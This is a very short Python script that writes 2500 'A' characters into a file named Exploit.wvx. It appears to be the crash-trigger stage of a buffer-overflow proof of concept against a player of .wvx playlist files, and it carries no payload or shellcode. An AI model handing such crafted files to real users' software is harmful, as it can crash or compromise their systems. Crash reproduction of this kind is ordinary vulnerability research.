junk="\x41"*2500
x=open('Exploit.wvx', 'w')
x.write(junk)
x.close()
